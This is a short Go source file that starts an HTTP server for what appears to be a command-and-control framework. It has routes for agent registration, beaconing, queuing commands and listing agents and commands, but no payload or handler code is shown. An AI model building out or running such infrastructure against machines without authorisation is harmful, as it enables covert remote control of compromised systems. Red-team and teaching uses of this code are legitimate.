package c2

import (
	"fmt"
	"log"
	"net/http"

	"server/handlers"
)

func StartHTTP(port int) {
	log.Printf("HTTP server listening on port %d", port)

	// Routes
	http.HandleFunc("/register", handlers.RegisterAgent)
	http.HandleFunc("/beacon", handlers.Beacon)
	http.HandleFunc("/addcommand", handlers.AddCommand)
	http.HandleFunc("/get/allcommands", handlers.GetAllCommands)
	http.HandleFunc("/get/allagents", handlers.GetAllAgents)

	// Start listening
	var port_str string = fmt.Sprintf(":%d", port)
	if err := http.ListenAndServe(port_str, nil); err != nil {
		log.Fatal(err)
	}
}